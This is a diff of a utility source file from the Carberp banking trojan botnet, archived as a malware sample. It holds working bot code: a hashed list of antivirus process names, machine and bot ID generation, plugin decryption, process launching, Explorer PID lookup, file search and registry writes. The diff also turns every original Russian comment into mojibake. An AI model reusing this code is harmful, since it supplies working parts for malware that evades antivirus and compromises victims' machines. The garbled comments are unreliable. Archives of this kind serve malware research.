@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     вЂ”
+ */
 #include <windows.h>
 #include <tlhelp32.h>
 #include <shlobj.h>
@@ -37,13 +48,13 @@ namespace Utils_Debug
 
 
 //--------------------------------------------------
-//  Сгенерированный идентификатор машины
+//  пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 //--------------------------------------------------
 char MachineID[17] = {0};
 
 
 //--------------------------------------------------
-//  Список имён процессов анти вирусов
+//  пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 //--------------------------------------------------
 const static DWORD AV_HASHES[] = {
 0x66328A61 /* avgcsrvx.exe*/, 0xE212D301 /* avgemcx.exe*/, 0x126BD3AC /* avgidsagent.exe*/,
@@ -252,7 +263,7 @@ return UidHash;
 */
 
 
-// добавлено при добавлении оперы
+// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 /************************************************************************/
 /*
 DWORD FileSize(HANDLE hFile)
@@ -266,7 +277,7 @@ DWORD FileSize(HANDLE hFile)
 }
 */
 /************************************************************************/
-/*                          Читает файл в буфер                         */
+/*                          пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅ                         */
 /*----------------------------------------------------------------------*/
 /*
 int ReadWholeFile(char *szFileName, char **OutBuf, int *Error)
@@ -274,11 +285,11 @@ int ReadWholeFile(char *szFileName, char **OutBuf, int *Error)
 	*Error = NOERROR;
 	int result = 0;
 
-	// Открываем файл на чтение
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	HANDLE hFile = pCreateFileA(szFileName, GENERIC_READ, FILE_SHARE_READ, NULL,
 														OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
 
-	// Если не удалось прочесть, выходим с ошибкой
+	// пїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	if (INVALID_HANDLE_VALUE != hFile)
 	{
 		DWORD fSize = FileSize(hFile);
@@ -291,10 +302,10 @@ int ReadWholeFile(char *szFileName, char **OutBuf, int *Error)
 			if (pReadFile(hFile, *OutBuf, fSize, &rSize, NULL))
 				result = rSize;
 		}
-		// Закрываем файл
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 		pCloseHandle(hFile);
 	}
-	// Возвращаем результат
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	if (!result)
 		*Error = pGetLastError();
 	return result;
@@ -307,7 +318,7 @@ int ReadWholeFile(char *szFileName, char **OutBuf, int *Error)
 
 
 //------------------------------------------------------------ 
-//генирация нового уида
+//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 int myHashData(DWORD lpData, DWORD dwDataSize) 
 {
 	DWORD dwResult = 0;
@@ -344,13 +355,13 @@ int myHashData(DWORD lpData, DWORD dwDataSize)
 
 PCHAR MakeMachineID()
 {
-	//данная функция вернет указатель на массив с идентификаторм машины
+	//пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	if (MachineID[0] != 0)
 		return MachineID;
 
 	m_memset(MachineID, 0, sizeof(MachineID));
 
-    // Генерируем идентификатор
+    // пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	char szRegPath1[] = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\0";
 	char szDigitalProductId[] = "DigitalProductId\0";
 	char szInstallDate[] = "InstallDate\0";
@@ -370,8 +381,8 @@ PCHAR MakeMachineID()
 		{
 			// prepare pCryptKeyBuff
 			PVOID pCryptKeyBuff;
-			//теоретически правельно использовать размер в страницу, ибо в МСДН написано что все что больше нее храниться не в реестре
-			//но читаемый размер всегда равен 164 байта берем с небольшим запасом
+			//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+			//пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ 164 пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 			pCryptKeyBuff = STR::Alloc(200); ///pGlobalAlloc(GPTR, 10240);
 			// init buffer with not-null pre-defined data to avoid clear data in registry in case of absent DigitalProductId in registry
 			m_memset(pCryptKeyBuff, 0x30, 100);
@@ -485,7 +496,7 @@ void GenerateUid(char *BotUid)
 //	return;
 
 
-	///далее идет старая
+	///пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 //	char *BotId = (char*)MemAlloc( 2048 );
 //
 //	DWORD dwUsernameLen = 255;
@@ -788,7 +799,7 @@ HANDLE OpenProcessEx( DWORD dwHash )
 
 bool InternalRunFile(bool Unicode, PCHAR Path, DWORD dwFlags, PHANDLE hProcess, PHANDLE hThread)
 {
-	// Функция запускает выполнение процесса
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 
 	STARTUPINFOW si;
 	PROCESS_INFORMATION pi;
@@ -1040,17 +1051,17 @@ LPVOID DecryptPlugin( LPBYTE Pointer, DWORD dwLen )
 
 DWORD GetExplorerPid()
 {
-	// Функция возвращает идентификатор процесса эксплорера (Explorer.exe)
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ (Explorer.exe)
 
     DWORD ExplorerPid = 0;
 
-	// Первым этапом пытаемся получить идентификатор по хэндлу окна системного
-	// трэя.
+	// пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+	// пїЅпїЅпїЅпїЅ.
 	char Class[] = {'S','h','e','l','l','_','T','r','a','y','W','n','d',0};
 	pGetWindowThreadProcessId(pFindWindowA(Class, NULL), &ExplorerPid);
 	
-	// В случае если не удалось определить идентификатор по хэндлу окна
-	// определяем его по имени запущенного процесса
+	// пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	if ( !ExplorerPid )
 		ExplorerPid = GetProcessIdByHash(0x490A0972 /* explorer.exe */);
 
@@ -1059,16 +1070,16 @@ DWORD GetExplorerPid()
 
 DWORD GetIExplorerPid()
 {
-	// Функция возвращает идентификатор процесса интернет эксплорера
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	DWORD ExplorerPid = 0;
 
-	// Первым этапом пытаемся получить идентификатор по хэндлу окна iexplorer.exe
-	// трэя.
+	// пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ iexplorer.exe
+	// пїЅпїЅпїЅпїЅ.
 	char Class[] = {'I','E','F','r','a','m','e',0};
 	pGetWindowThreadProcessId(pFindWindowA(Class, NULL), &ExplorerPid);
 	
-	// В случае если не удалось определить идентификатор по хэндлу окна
-	// определяем его по имени запущенного процесса
+	// пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	if ( !ExplorerPid )
 		ExplorerPid = GetProcessIdByHash(0x2500D98F);
 
@@ -1077,16 +1088,16 @@ DWORD GetIExplorerPid()
 
 //----------------------------------------------------------------------------
 
-// Набор значений для генератора случайных чисел
+// пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 static DWORD Random_State[16] = {0};
 
-// Индекс генератора случайных чисел
+// пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 static unsigned int Random_Index = 0;
 
 
 void Random::Initialize()
 {
-	// Инициализируем генератор случайных чисел
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 	for (int i = 0; i < 16; i++)
 	{
 		Random_State[i] = (DWORD)pGetTickCount();
@@ -1097,7 +1108,7 @@ void Random::Initialize()
 
 DWORD Random::Generate()
 {
-	// Генерировать случайное число
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 	if (Random_State[0] == 0)
 		Initialize();
 
@@ -1119,7 +1130,7 @@ DWORD Random::Generate()
 
 DWORD Random::Generate(DWORD Min, DWORD Max)
 {
-	// Генерировать случайное число в диапазоне от Min до Max
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ Min пїЅпїЅ Max
 	DWORD Range = 0;
 	DWORD Min_V = 0;
 
@@ -1152,8 +1163,8 @@ namespace Random
 
 PCHAR Random::RandomString(DWORD Length, char Min, char Max)
 {
-	// Генерировать строку случайных символов
-	// Min, Max - диапазон генерации символов
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+	// Min, Max - пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	PCHAR S = STR::Alloc(Length);
 	FillChars(S, Length, Min, Max);
 	return S;
@@ -1191,7 +1202,7 @@ PCHAR GenerateBotID()
 
 bool DirExists(PCHAR Path)
 {
-	// Функция возвращает истину если путь Path существует
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ Path пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
   DWORD Code = (DWORD)pGetFileAttributesA(Path);
   return (Code != INVALID_FILE_ATTRIBUTES) && ((Code & FILE_ATTRIBUTE_DIRECTORY) != 0);
 }
@@ -1214,7 +1225,7 @@ bool FileExistsW(const PWCHAR FileName)
 
 bool InvalidPath(char *Path)
 {
-	// Функция вернёт истину в случае если путь один из ".", ".."
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅ ".", ".."
 	return (StrSame(Path, ".") || StrSame(Path,".."));
 }
 
@@ -1228,7 +1239,7 @@ struct TRecursiveSearchData
 
 void RecursuveSearchCallBack(PFindData Find, PCHAR Path, LPVOID Data, bool &Cancel)
 {
-	// Ищем файлы в директории
+	// пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	TRecursiveSearchData *SD = (TRecursiveSearchData *)Data;
 	Cancel = SearchFiles(Path, SD->Mask, false, SD->Attributes, SD->Data, SD->CallBack) == false;
 }
@@ -1236,7 +1247,7 @@ void RecursuveSearchCallBack(PFindData Find, PCHAR Path, LPVOID Data, bool &Canc
 bool SearchFiles(PCHAR Path, PCHAR Mask, bool Recursive, DWORD FileAttributes,
 				 LPVOID Data, TFilesCallBack CallBack)
 {
-	// Функция пербирает все поддериктории
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	if (STR::IsEmpty(Path) || STR::IsEmpty(Mask) || CallBack == NULL)
 		return true;
 
@@ -1246,12 +1257,12 @@ bool SearchFiles(PCHAR Path, PCHAR Mask, bool Recursive, DWORD FileAttributes,
 	m_lstrcpy( SearchMask, Path );
 	pPathAppendA( SearchMask, Mask );
 
-	//  Ищем первую директорию
+	//  пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	WIN32_FIND_DATAA Find;
 	ClearStruct(Find);
 	HANDLE File = pFindFirstFileA(SearchMask, &Find);
 
-	//  Директория не найдена, выходим из функции
+	//  пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	if (File == INVALID_HANDLE_VALUE)
 	{
 		STR::Free(SearchMask);
@@ -1260,7 +1271,7 @@ bool SearchFiles(PCHAR Path, PCHAR Mask, bool Recursive, DWORD FileAttributes,
 		if (FileAttributes == FA_DIRECTORY)
 			return true;
 
-		if (Error != 5 /* Нет доступа */ && Recursive && DirExists(Path))
+		if (Error != 5 /* пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ */ && Recursive && DirExists(Path))
 		{
 
 			TRecursiveSearchData SD;
@@ -1289,14 +1300,14 @@ bool SearchFiles(PCHAR Path, PCHAR Mask, bool Recursive, DWORD FileAttributes,
 		if ((Find.dwFileAttributes & Attributes) != 0)
 		{
             Count++;
-			// Собираем полное имя
+			// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ
 			NewPath = STR::Alloc( m_lstrlen(Path) + m_lstrlen(Find.cFileName) + 10 );
 			m_lstrcpy( NewPath, Path );
 			pPathAppendA( NewPath, Find.cFileName );
 			if( Find.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY )
 				m_lstrcat( NewPath, "\\" );
 
-			// Вызываем метод обратной связи
+			// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 			if ((Find.dwFileAttributes & FileAttributes) != 0)
 				CallBack(&Find,  NewPath, Data, Cancel);
             //
@@ -1315,8 +1326,8 @@ bool SearchFiles(PCHAR Path, PCHAR Mask, bool Recursive, DWORD FileAttributes,
 	pFindClose(File);
 	STR::Free(SearchMask);
 
-	// В случае если рекурсивный поиск не обработан, то производим
-	// рекурсивный перебор директорий
+	// пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	if (!Cancel && Recursive && !RecursiveHandled && Count > 0)
 	{
 		TRecursiveSearchData SD;
@@ -1333,8 +1344,8 @@ bool SearchFiles(PCHAR Path, PCHAR Mask, bool Recursive, DWORD FileAttributes,
 
 DWORD GetUniquePID(DWORD *ThreadHandle)
 {
-	// Функция возвращает уникальный идентификатор процесса. Определяется по
-	// потоку из которого вызывается модуль
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ. пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ
+	// пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	HANDLE Thread = pGetCurrentThread();
 	THREAD_BASIC_INFORMATION Threads;
 	DWORD dwReturnLen;
@@ -1389,9 +1400,9 @@ bool IsProcessLeave(int pid)
 
 bool IsNewProcess(DWORD &ProcessID, DWORD *Thread)
 {
-	// Функция возвращает истину если идентификатор текущего процесса
-	// отличается от идентификатора ProcessID. Если это другой процесс
-	// то PID будет записан в ProcessID
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ ProcessID. пїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+	// пїЅпїЅ PID пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ ProcessID
 	DWORD NewPID = GetUniquePID(Thread);
 	if (ProcessID != NewPID)
 	{
@@ -1406,7 +1417,7 @@ bool IsNewProcess(DWORD &ProcessID, DWORD *Thread)
 char *GetNetInfo()
 {
 
-	// Какому мудаку было впадлу пару строчек коментария вписать???????
+	// пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ???????
 
 /*	char iphldll[] = {'i','p','h','l','p','a','p','i','.','d','l','l',0};
 
@@ -1567,12 +1578,12 @@ void MakeShutdown()
 
 
 //----------------------------------------------------------------------------
-// Registry - методы для работы с реестром Windows
+// Registry - пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ Windows
 //----------------------------------------------------------------------------
 
 bool Registry::CreateKey(HKEY h, char* path, char* name )
 {
-	// cсоздать раздел в реестре
+	// cпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	//  CreateKey(HKEY_CURRENT_USER,"Software\\Microsoft\\Internet Explorer\\Main","TabProcGrowth");
 	HKEY key;
 	if((long)pRegOpenKeyExA(h, path, 0, KEY_WRITE, &key) == REG_OPENED_EXISTING_KEY)
@@ -1587,8 +1598,8 @@ bool Registry::CreateKey(HKEY h, char* path, char* name )
 
 bool Registry::SetValueString(HKEY h, char* path, char* name,  char* values )
 {
-	//корневой ключ, путь без ключа, имя создаваемого значения,
-	// значение(создает заменяет значение REG_SZ)
+	//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ,
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ(пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ REG_SZ)
 	HKEY key;
 	TCHAR title[MAX_PATH];
 	m_memset(title,0,MAX_PATH);
@@ -1604,8 +1615,8 @@ bool Registry::SetValueString(HKEY h, char* path, char* name,  char* values )
 
 bool Registry::SetValueDWORD(HKEY h, char* path, char* name,  DWORD values )
 {
-	//Корневой ключ, путь без ключа, имя создаваемого значения,
-	// значение(создает заменяет значение REG_DWORD)
+	//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ,
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ(пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ REG_DWORD)
 	HKEY key;
 	if((long)pRegOpenKeyExA(h,path,0,KEY_WRITE, &key)==REG_OPENED_EXISTING_KEY)
 		return false;
@@ -1615,12 +1626,12 @@ bool Registry::SetValueDWORD(HKEY h, char* path, char* name,  DWORD values )
 }
 
 
-// Функция получает строковое значение из реестра
+// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 PCHAR Registry::GetStringValue(HKEY Key, PCHAR SubKey, PCHAR Value)
 {
-	// Функция получает строковое значение из реестра
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	HKEY OpenedKey;
-	// Открываем ключ
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 	if (pRegOpenKeyExA(Key, SubKey, 0, KEY_READ, &OpenedKey) != ERROR_SUCCESS)
 		return NULL;
 
@@ -1628,10 +1639,10 @@ PCHAR Registry::GetStringValue(HKEY Key, PCHAR SubKey, PCHAR Value)
 	DWORD Sz = 0;
 	PCHAR Result = NULL;
 
-	// Получаем размер строки
